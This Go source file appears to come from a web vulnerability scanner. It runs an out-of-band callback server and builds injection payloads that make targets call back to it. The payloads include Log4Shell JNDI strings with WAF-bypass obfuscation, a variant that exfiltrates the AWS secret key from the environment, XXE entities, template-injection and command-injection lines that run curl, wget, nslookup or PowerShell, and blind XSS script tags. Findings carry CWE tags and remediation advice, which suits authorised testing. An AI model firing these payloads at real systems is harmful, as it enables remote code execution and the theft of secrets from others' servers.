package engine

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// OOBServer is an out-of-band callback server for confirming blind vulnerabilities.
// It runs an HTTP listener that captures incoming requests from injected payloads,
// correlating them back to specific mutations via unique interaction IDs.
type OOBServer struct {
	addr        string
	externalURL string // The URL targets will call back to (e.g., http://your-vps:8888)
	server      *http.Server
	listener    net.Listener

	mu           sync.RWMutex
	interactions map[string]*OOBInteraction // interactionID -> interaction data
	callbacks    []OOBCallback              // all received callbacks
	running      bool
}

// OOBInteraction tracks a pending OOB interaction linked to a specific mutation
type OOBInteraction struct {
	ID        string    `json:"id"`
	Header    string    `json:"header"`
	Payload   string    `json:"payload"`
	Category  string    `json:"category"`
	Impact    string    `json:"impact"`
	CreatedAt time.Time `json:"created_at"`
	Confirmed bool      `json:"confirmed"`
	Callback  *OOBCallback `json:"callback,omitempty"`
}

// OOBCallback records an incoming callback from a target
type OOBCallback struct {
	InteractionID string            `json:"interaction_id"`
	RemoteAddr    string            `json:"remote_addr"`
	Method        string            `json:"method"`
	Path          string            `json:"path"`
	Headers       map[string]string `json:"headers"`
	Body          string            `json:"body,omitempty"`
	ReceivedAt    time.Time         `json:"received_at"`
	Protocol      string            `json:"protocol"` // "http" or "dns"
}

// NewOOBServer creates a new OOB callback server
func NewOOBServer(listenAddr, externalURL string) *OOBServer {
	if externalURL == "" {
		externalURL = "http://" + listenAddr
	}
	// Ensure no trailing slash
	externalURL = strings.TrimRight(externalURL, "/")

	return &OOBServer{
		addr:         listenAddr,
		externalURL:  externalURL,
		interactions: make(map[string]*OOBInteraction),
	}
}

// Start begins listening for OOB callbacks
func (s *OOBServer) Start() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", s.handleCallback)
	mux.HandleFunc("/health", s.handleHealth)
	mux.HandleFunc("/interactions", s.handleListInteractions)

	s.server = &http.Server{
		Handler:      mux,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	var err error
	s.listener, err = net.Listen("tcp", s.addr)
	if err != nil {
		return fmt.Errorf("oob server listen failed: %w", err)
	}

	s.mu.Lock()
	s.running = true
	s.mu.Unlock()

	go func() {
		if err := s.server.Serve(s.listener); err != nil && err != http.ErrServerClosed {
			fmt.Printf("\033[0;31m[OOB]\033[0m Server error: %v\n", err)
		}
	}()

	fmt.Printf("\033[0;35m[OOB]\033[0m Callback server started on %s\n", s.addr)
	fmt.Printf("\033[0;35m[OOB]\033[0m External URL: %s\n", s.externalURL)
	return nil
}

// Stop shuts down the OOB server
func (s *OOBServer) Stop() {
	s.mu.Lock()
	s.running = false
	s.mu.Unlock()

	if s.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		s.server.Shutdown(ctx)
	}
}

// IsRunning returns whether the OOB server is active
func (s *OOBServer) IsRunning() bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.running
}

// GenerateInteraction creates a new unique interaction ID linked to a mutation
func (s *OOBServer) GenerateInteraction(header, payload, category, impact string) string {
	id := generateInteractionID()

	s.mu.Lock()
	s.interactions[id] = &OOBInteraction{
		ID:        id,
		Header:    header,
		Payload:   payload,
		Category:  category,
		Impact:    impact,
		CreatedAt: time.Now(),
	}
	s.mu.Unlock()

	return id
}

// GetCallbackURL returns the full callback URL for an interaction ID
func (s *OOBServer) GetCallbackURL(interactionID string) string {
	return fmt.Sprintf("%s/%s", s.externalURL, interactionID)
}

// GetDNSHostname returns a DNS hostname that would resolve to the OOB server
func (s *OOBServer) GetDNSHostname(interactionID string) string {
	return fmt.Sprintf("%s.oob.local", interactionID)
}

// CollectConfirmed waits for a specified duration and returns all confirmed interactions
func (s *OOBServer) CollectConfirmed(waitDuration time.Duration) []*OOBInteraction {
	if waitDuration > 0 {
		fmt.Printf("\033[0;35m[OOB]\033[0m Waiting %s for callbacks...\n", waitDuration)
		time.Sleep(waitDuration)
	}

	s.mu.RLock()
	defer s.mu.RUnlock()

	var confirmed []*OOBInteraction
	for _, interaction := range s.interactions {
		if interaction.Confirmed {
			confirmed = append(confirmed, interaction)
		}
	}
	return confirmed
}

// GetAllCallbacks returns all received callbacks
func (s *OOBServer) GetAllCallbacks() []OOBCallback {
	s.mu.RLock()
	defer s.mu.RUnlock()
	result := make([]OOBCallback, len(s.callbacks))
	copy(result, s.callbacks)
	return result
}

// PendingCount returns the number of pending (unconfirmed) interactions
func (s *OOBServer) PendingCount() int {
	s.mu.RLock()
	defer s.mu.RUnlock()
	count := 0
	for _, i := range s.interactions {
		if !i.Confirmed {
			count++
		}
	}
	return count
}

// ConfirmedCount returns the number of confirmed interactions
func (s *OOBServer) ConfirmedCount() int {
	s.mu.RLock()
	defer s.mu.RUnlock()
	count := 0
	for _, i := range s.interactions {
		if i.Confirmed {
			count++
		}
	}
	return count
}

// handleCallback processes incoming OOB callbacks
func (s *OOBServer) handleCallback(w http.ResponseWriter, r *http.Request) {
	// Extract interaction ID from path
	path := strings.TrimPrefix(r.URL.Path, "/")
	parts := strings.SplitN(path, "/", 2)
	interactionID := parts[0]

	if interactionID == "" || interactionID == "favicon.ico" {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Build callback record
	headers := make(map[string]string)
	for k, vals := range r.Header {
		if len(vals) > 0 {
			headers[k] = vals[0]
		}
	}

	callback := OOBCallback{
		InteractionID: interactionID,
		RemoteAddr:    r.RemoteAddr,
		Method:        r.Method,
		Path:          r.URL.Path,
		Headers:       headers,
		ReceivedAt:    time.Now(),
		Protocol:      "http",
	}

	s.mu.Lock()
	s.callbacks = append(s.callbacks, callback)

	// Try to correlate with a registered interaction
	if interaction, exists := s.interactions[interactionID]; exists {
		interaction.Confirmed = true
		interaction.Callback = &callback
		fmt.Printf("\033[1;32m[OOB]\033[0m CALLBACK RECEIVED for %s | Header: %s | From: %s\n",
			interactionID, interaction.Header, r.RemoteAddr)
	} else {
		fmt.Printf("\033[0;33m[OOB]\033[0m Unregistered callback: %s from %s\n",
			interactionID, r.RemoteAddr)
	}
	s.mu.Unlock()

	// Respond with empty 200 to avoid errors on the target side
	w.WriteHeader(http.StatusOK)
}

// handleHealth returns server health status
func (s *OOBServer) handleHealth(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	total := len(s.interactions)
	confirmed := 0
	for _, i := range s.interactions {
		if i.Confirmed {
			confirmed++
		}
	}
	s.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":      "running",
		"total":       total,
		"confirmed":   confirmed,
		"pending":     total - confirmed,
		"callbacks":   len(s.callbacks),
	})
}

// handleListInteractions returns all interactions as JSON
func (s *OOBServer) handleListInteractions(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(s.interactions)
}

// OOBToFindings converts confirmed OOB interactions into findings
func OOBToFindings(confirmed []*OOBInteraction) []Finding {
	var findings []Finding

	for _, interaction := range confirmed {
		severity := "High"
		cvss := 8.0
		cwe := "CWE-918"
		confidence := 0.95

		switch interaction.Category {
		case "SSRF":
			severity = "Critical"
			cvss = 9.8
			cwe = "CWE-918"
			confidence = 0.95
		case "Injection":
			severity = "Critical"
			cvss = 9.8
			cwe = "CWE-94"
			confidence = 0.9
			if strings.Contains(strings.ToLower(interaction.Impact), "log4") {
				cwe = "CWE-917"
			}
		case "Debug":
			severity = "High"
			cvss = 7.5
			cwe = "CWE-200"
			confidence = 0.85
		}

		evidence := map[string]string{
			"oob_confirmed":   "true",
			"interaction_id":  interaction.ID,
			"callback_source": "blind_vulnerability",
		}

		if interaction.Callback != nil {
			evidence["callback_from"] = interaction.Callback.RemoteAddr
			evidence["callback_method"] = interaction.Callback.Method
			evidence["callback_path"] = interaction.Callback.Path
			evidence["callback_time"] = interaction.Callback.ReceivedAt.Format(time.RFC3339)
		}

		findings = append(findings, Finding{
			Header:          interaction.Header,
			Payload:         interaction.Payload,
			Impact:          fmt.Sprintf("BLIND %s confirmed via OOB callback", interaction.Category),
			Confidence:      "Confirmed",
			ConfidenceScore: confidence,
			Evidence:        evidence,
			Category:        interaction.Category,
			Severity:        severity,
			CVSS:            cvss,
			CWE:             cwe,
			Remediation:     getOOBRemediation(interaction.Category),
			Timestamp:       time.Now(),
			Verified:        true,
			VerifiedAt:      time.Now(),
		})
	}

	return findings
}

func getOOBRemediation(category string) string {
	switch category {
	case "SSRF":
		return "Validate and sanitize all URL inputs server-side. Block requests to internal IPs, metadata endpoints (169.254.169.254), and localhost. Use allowlists for permitted destinations."
	case "Injection":
		return "Sanitize all header values before processing. Update all dependencies (Log4j, template engines). Implement WAF rules to block injection payloads. Never evaluate user input as code."
	default:
		return "Disable debug endpoints in production. Sanitize all header values. Implement strict input validation."
	}
}

// generateInteractionID creates a unique ID for OOB tracking
func generateInteractionID() string {
	b := make([]byte, 12)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("hh%d", time.Now().UnixNano())
	}
	return "hh" + hex.EncodeToString(b)
}

// InjectOOBPayloads generates OOB-enhanced versions of mutations when OOB server is active
func InjectOOBPayloads(oob *OOBServer, mutations []Mutation) []Mutation {
	if oob == nil || !oob.IsRunning() {
		return mutations
	}

	var enhanced []Mutation

	for _, m := range mutations {
		enhanced = append(enhanced, m) // Keep original

		switch m.Category {
		case "SSRF":
			id := oob.GenerateInteraction(m.Header, m.Value, "SSRF", m.Impact)
			callbackURL := oob.GetCallbackURL(id)
			host := extractHost(callbackURL)

			// Direct callback
			enhanced = append(enhanced, Mutation{
				Header:   m.Header,
				Value:    callbackURL,
				Category: m.Category,
				Impact:   "Blind SSRF via OOB callback (" + m.Header + ")",
			})
			enhanced = append(enhanced, Mutation{
				Header:   m.Header,
				Value:    callbackURL + "/ssrf",
				Category: m.Category,
				Impact:   "Blind SSRF via OOB callback with path (" + m.Header + ")",
			})

			// URL scheme variants for SSRF
			if strings.Contains(m.Value, "169.254") || strings.Contains(m.Value, "localhost") ||
				strings.Contains(m.Value, "127.0.0") || strings.Contains(m.Value, "metadata") {
				// HTTP/HTTPS variants
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    "http://" + host + "/" + id,
					Category: m.Category,
					Impact:   "Blind SSRF HTTP OOB (" + m.Header + ")",
				})
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    "https://" + host + "/" + id,
					Category: m.Category,
					Impact:   "Blind SSRF HTTPS OOB (" + m.Header + ")",
				})
			}

			// DNS-based SSRF OOB (for when HTTP callbacks are blocked)
			id2 := oob.GenerateInteraction(m.Header, m.Value, "SSRF", "DNS-based SSRF via "+m.Header)
			enhanced = append(enhanced, Mutation{
				Header:   m.Header,
				Value:    id2 + "." + host,
				Category: m.Category,
				Impact:   "Blind SSRF DNS OOB (" + m.Header + ")",
			})

		case "Injection":
			id := oob.GenerateInteraction(m.Header, m.Value, "Injection", m.Impact)
			callbackURL := oob.GetCallbackURL(id)
			host := extractHost(callbackURL)

			impactLower := strings.ToLower(m.Impact)

			// Log4Shell OOB — comprehensive bypass variants
			if strings.Contains(m.Value, "${jndi") || strings.Contains(impactLower, "log4") {
				// LDAP OOB
				id1 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind Log4Shell LDAP OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf("${jndi:ldap://%s/%s}", host, id1),
					Category: m.Category,
					Impact:   "Blind Log4Shell LDAP OOB",
				})
				// LDAPS OOB
				id2 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind Log4Shell LDAPS OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf("${jndi:ldaps://%s/%s}", host, id2),
					Category: m.Category,
					Impact:   "Blind Log4Shell LDAPS OOB",
				})
				// DNS OOB
				id3 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind Log4Shell DNS OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf("${jndi:dns://%s/%s}", host, id3),
					Category: m.Category,
					Impact:   "Blind Log4Shell DNS OOB",
				})
				// RMI OOB
				id4 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind Log4Shell RMI OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf("${jndi:rmi://%s/%s}", host, id4),
					Category: m.Category,
					Impact:   "Blind Log4Shell RMI OOB",
				})
				// Obfuscated LDAP OOB (WAF bypass)
				id5 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind Log4Shell Obfuscated OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf("${${lower:j}ndi:${lower:l}dap://%s/%s}", host, id5),
					Category: m.Category,
					Impact:   "Blind Log4Shell Obfuscated OOB",
				})
				id6 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind Log4Shell Nested OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf("${j${::-n}${::-d}${::-i}:ldap://%s/%s}", host, id6),
					Category: m.Category,
					Impact:   "Blind Log4Shell Nested OOB",
				})
				// Env exfil via Log4Shell
				id7 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Log4Shell Env Exfil OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    "${jndi:ldap://" + host + "/" + id7 + "/${env:AWS_SECRET_ACCESS_KEY}}",
					Category: m.Category,
					Impact:   "Log4Shell AWS Key Exfil OOB",
				})
			}

			// XXE OOB — multiple techniques
			if strings.Contains(impactLower, "xxe") || strings.Contains(impactLower, "xml") ||
				strings.Contains(m.Value, "application/xml") {
				id1 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind XXE OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s/%s">]><foo>&xxe;</foo>`, callbackURL, id1),
					Category: m.Category,
					Impact:   "Blind XXE SYSTEM OOB",
				})
				// Parameter entity XXE OOB
				id2 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind XXE Parameter Entity OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "%s/%s">%%xxe;]>`, callbackURL, id2),
					Category: m.Category,
					Impact:   "Blind XXE Parameter Entity OOB",
				})
			}

			// SSTI OOB — per template engine
			if strings.Contains(impactLower, "ssti") || strings.Contains(impactLower, "template") {
				// Java (Thymeleaf/Freemarker/Velocity)
				id1 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind SSTI Java OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf(`${T(java.lang.Runtime).getRuntime().exec("curl %s/%s")}`, callbackURL, id1),
					Category: m.Category,
					Impact:   "Blind SSTI Java curl OOB",
				})
				// Python (Jinja2)
				id2 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind SSTI Python OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf(`{{config.__class__.__init__.__globals__['os'].popen('curl %s/%s').read()}}`, callbackURL, id2),
					Category: m.Category,
					Impact:   "Blind SSTI Jinja2 curl OOB",
				})
				// PHP (Twig)
				id3 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind SSTI PHP OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf(`{{['curl %s/%s']|filter('system')}}`, callbackURL, id3),
					Category: m.Category,
					Impact:   "Blind SSTI Twig system OOB",
				})
			}

			// Command injection OOB
			if strings.Contains(impactLower, "command") || strings.Contains(m.Value, "; ") ||
				strings.Contains(m.Value, "| ") || strings.Contains(m.Value, "$(") {
				id1 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind RCE curl OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf("| curl %s/%s", callbackURL, id1),
					Category: m.Category,
					Impact:   "Blind RCE curl OOB",
				})
				id2 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind RCE wget OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf("| wget -q -O- %s/%s", callbackURL, id2),
					Category: m.Category,
					Impact:   "Blind RCE wget OOB",
				})
				id3 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind RCE nslookup OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf("| nslookup %s.%s", id3, host),
					Category: m.Category,
					Impact:   "Blind RCE DNS exfil OOB",
				})
				id4 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind RCE curl whoami OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf(`$(curl %s/%s/$(whoami))`, callbackURL, id4),
					Category: m.Category,
					Impact:   "Blind RCE curl whoami exfil OOB",
				})
				id5 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind RCE PowerShell OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf(`& powershell -c "IWR -Uri %s/%s"`, callbackURL, id5),
					Category: m.Category,
					Impact:   "Blind RCE PowerShell OOB (Windows)",
				})
			}

			// Blind XSS OOB (persistent XSS detection)
			if strings.Contains(impactLower, "xss") || strings.Contains(m.Value, "<script") ||
				strings.Contains(m.Value, "onerror") || strings.Contains(m.Value, "onload") {
				id1 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind XSS OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf(`"><img src=%s/%s>`, callbackURL, id1),
					Category: m.Category,
					Impact:   "Blind XSS img src OOB",
				})
				id2 := oob.GenerateInteraction(m.Header, m.Value, "Injection", "Blind XSS Script OOB")
				enhanced = append(enhanced, Mutation{
					Header:   m.Header,
					Value:    fmt.Sprintf(`"><script src=%s/%s></script>`, callbackURL, id2),
					Category: m.Category,
					Impact:   "Blind XSS script src OOB",
				})
			}

		case "Cloud":
			id := oob.GenerateInteraction(m.Header, m.Value, "SSRF", "Cloud metadata access via "+m.Header)
			callbackURL := oob.GetCallbackURL(id)
			enhanced = append(enhanced, Mutation{
				Header:   m.Header,
				Value:    callbackURL,
				Category: "SSRF",
				Impact:   "Blind cloud metadata access via OOB callback",
			})

		case "Debug":
			id := oob.GenerateInteraction(m.Header, m.Value, "Debug", "Debug endpoint callback via "+m.Header)
			callbackURL := oob.GetCallbackURL(id)
			enhanced = append(enhanced, Mutation{
				Header:   m.Header,
				Value:    callbackURL,
				Category: "Debug",
				Impact:   "Debug endpoint OOB callback",
			})
		}
	}

	return enhanced
}

// extractHost gets the host:port from a URL
func extractHost(rawURL string) string {
	rawURL = strings.TrimPrefix(rawURL, "http://")
	rawURL = strings.TrimPrefix(rawURL, "https://")
	parts := strings.SplitN(rawURL, "/", 2)
	return parts[0]
}
